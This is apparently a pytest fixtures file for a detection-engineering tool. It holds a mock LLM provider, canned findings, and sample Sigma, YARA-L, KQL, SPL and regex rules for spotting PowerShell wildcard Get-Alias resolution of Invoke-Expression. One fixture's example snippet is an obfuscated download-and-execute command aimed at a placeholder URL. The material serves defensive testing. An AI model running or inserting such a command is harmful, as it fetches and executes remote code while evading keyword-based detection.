"""Shared test fixtures for `tests/engine/`: a mock LLM provider and canned,
realistic response builders so detection/generation tests don't need a real
provider implementation (owned by a different builder) to exist or be network-
reachable.
"""

from __future__ import annotations

import json

import pytest

from globwarden.llm.base import LLMProvider, LLMResponse


class MockLLMProvider(LLMProvider):
    """In-memory `LLMProvider` implementation for tests.

    Returns canned response texts in order from `responses`, one per call to
    `complete()`. If more calls happen than responses were supplied, the last
    response is repeated (convenient for tests that don't care about the exact
    call count). Every call is recorded in `self.calls` for assertions about
    what prompts/images/json_mode the engine code actually sent.
    """

    name = "mock"

    def __init__(self, responses: list[str] | None = None, available: bool = True):
        self._responses = list(responses or [])
        self._call_count = 0
        self.calls: list[dict] = []
        self._available = available

    def complete(
        self,
        system_prompt: str,
        user_prompt: str,
        images: list[bytes] | None = None,
        json_mode: bool = False,
    ) -> LLMResponse:
        self.calls.append(
            {
                "system_prompt": system_prompt,
                "user_prompt": user_prompt,
                "images": images,
                "json_mode": json_mode,
            }
        )
        if self._responses:
            index = min(self._call_count, len(self._responses) - 1)
            text = self._responses[index]
        else:
            text = ""
        self._call_count += 1
        return LLMResponse(text=text, model="mock-model-1", provider=self.name, raw=None)

    def is_available(self) -> bool:
        return self._available

    @property
    def call_count(self) -> int:
        return self._call_count


@pytest.fixture
def mock_provider_factory():
    """Factory fixture: `mock_provider_factory(responses=[...])` -> MockLLMProvider."""

    def _make(responses: list[str] | None = None, available: bool = True) -> MockLLMProvider:
        return MockLLMProvider(responses=responses, available=available)

    return _make


# ---------------------------------------------------------------------------
# Canned response builders
# ---------------------------------------------------------------------------


def detection_response_json(findings: list[dict]) -> str:
    return json.dumps({"findings": findings})


def wildcard_finding_dict(finding_id: str = "f1") -> dict:
    return {
        "id": finding_id,
        "category": "wildcard_resolution",
        "technique_name": "Wildcard Get-Alias resolution of Invoke-Expression",
        "description": (
            "The report shows Get-Alias invoked with a wildcard pattern ('i*x') to "
            "resolve the 'iex' alias at runtime, then invokes the resolved command "
            "object directly via the call operator, so the literal string "
            "'Invoke-Expression' never appears in the command line."
        ),
        "example_snippet": "&(Get-Alias i*x) (irm https://example.com/a)",
        "confidence": 0.92,
        "attack_mapping": "T1027.010 (parent: T1027)",
        "source_ref": "paragraph 2",
    }


def regex_response_json(pattern: str, explanation: str = "Flags wildcard alias resolution.") -> str:
    return json.dumps({"pattern": pattern, "explanation": explanation})


def sigma_response_json(rule_yaml: str, explanation: str = "Flags wildcard alias resolution.") -> str:
    return json.dumps({"rule_yaml": rule_yaml, "explanation": explanation})


def kql_response_json(query: str, explanation: str = "Hunts for wildcard alias resolution.") -> str:
    return json.dumps({"query": query, "explanation": explanation})


def spl_response_json(query: str, explanation: str = "Hunts for wildcard alias resolution.") -> str:
    return json.dumps({"query": query, "explanation": explanation})


def yara_l_response_json(rule: str, explanation: str = "Flags wildcard alias resolution.") -> str:
    return json.dumps({"rule": rule, "explanation": explanation})


VALID_SIGMA_RULE = """\
title: PowerShell Wildcard Get-Alias Resolution of IEX
id: 11111111-1111-4111-8111-111111111111
status: experimental
description: Detects wildcard Get-Alias resolution used to invoke IEX indirectly.
logsource:
  category: ps_script
  product: windows
detection:
  selection:
    ScriptBlockText|contains:
      - '(gal '
      - '(Get-Alias '
  condition: selection
level: high
tags:
  - attack.defense-evasion
  - attack.t1027.010
  - attack.t1027
"""

VALID_YARA_L_RULE = """\
rule wildcard_get_alias_iex_resolution {
  meta:
    description = "Detects wildcard Get-Alias resolution used to invoke IEX indirectly"
    author = "GlobWarden"
    severity = "High"
  events:
    $e.metadata.event_type = "PROCESS_LAUNCH"
    $e.target.process.command_line = /(?i)(get-alias|gal).{0,40}\\*/ nocase
  condition:
    $e
}
"""

VALID_KQL_QUERY = """\
DeviceProcessEvents
| where Timestamp > ago(7d)
| where ProcessCommandLine has_any ("Get-Alias", "gal")
| where ProcessCommandLine matches regex @"(?i)[a-z]*\\*[a-z]*"
| project Timestamp, DeviceName, ProcessCommandLine
"""

VALID_SPL_QUERY = """\
index=windows sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode=4104
| regex ScriptBlockText="(?i)\\(gal\\s+[a-z]*\\*[a-z]*\\)"
| table _time, host, ScriptBlockText
"""

VALID_REGEX_PATTERN = r"(?i)&\s*\(\s*(get-alias|gal)\s+[a-z]*\*[a-z]*\s*\)"
